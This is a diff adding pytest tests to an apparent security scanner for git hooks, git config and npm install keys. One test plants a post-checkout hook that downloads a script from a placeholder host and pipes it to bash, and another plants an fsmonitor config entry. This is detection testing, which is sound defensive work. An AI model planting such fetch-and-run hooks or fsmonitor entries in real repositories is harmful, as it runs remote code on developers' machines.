@@ -119,3 +119,45 @@ def test_cp1252_output_does_not_crash(tmp_path):
                        capture_output=True, env=env)
     assert r.returncode == 0, r.stderr
     assert b"PASS" in r.stdout
+
+
+
+# R1) git internals: hooks and config are scanned, objects/refs/*.sample are skipped, nested .git alike
+@pytest.mark.parametrize("base", [".git", "vendor/x/.git"])
+def test_git_hook_with_pipe_to_shell_blocks(tmp_path, base):
+    hooks = tmp_path / base / "hooks"
+    hooks.mkdir(parents=True)
+    line = "cu" + "rl https://example.invalid/setup.sh | " + "ba" + "sh"
+    (hooks / "post-checkout").write_text("#!/bin/sh\n" + line + "\n", encoding="utf-8")
+    r = scan(tmp_path)
+    assert r.returncode == 1
+    assert "pipe-to-shell" in r.stdout
+
+
+def test_git_config_fsmonitor_and_alias_are_flagged(tmp_path):
+    (tmp_path / ".git").mkdir()
+    (tmp_path / ".git" / "config").write_text(
+        "[core]\n\tfs" + "monitor = ./x.sh\n[alias]\n\tco = !echo hi\n", encoding="utf-8")
+    r = scan(tmp_path)
+    assert "fsmonitor" in r.stdout and "Git-Alias" in r.stdout
+    assert r.returncode == 0  # MEDIUM -> REVIEW, at least
+
+
+def test_git_objects_and_samples_are_skipped(tmp_path):
+    (tmp_path / "SKILL.md").write_text("# Demo\n", encoding="utf-8")
+    obj = tmp_path / ".git" / "objects" / "ab"
+    obj.mkdir(parents=True)
+    (obj / "cdef").write_bytes(b"\x00\x01binary")
+    (tmp_path / ".git" / "hooks").mkdir()
+    (tmp_path / ".git" / "hooks" / "pre-commit.sample").write_text("#!/bin/sh\nfetch(\n", encoding="utf-8")
+    r = scan(tmp_path)
+    assert r.returncode == 0
+    assert "PASS" in r.stdout and "UNCHECKED" not in r.stdout
+
+
+# R6) npm hook pattern applies to package.json only
+def test_install_key_in_other_json_is_not_npm_hook(tmp_path):
+    (tmp_path / "config.json").write_text('{"inst' + 'all": {"dir": "x"}}\n', encoding="utf-8")
+    r = scan(tmp_path)
+    assert r.returncode == 0
+    assert "npm install" not in r.stdout
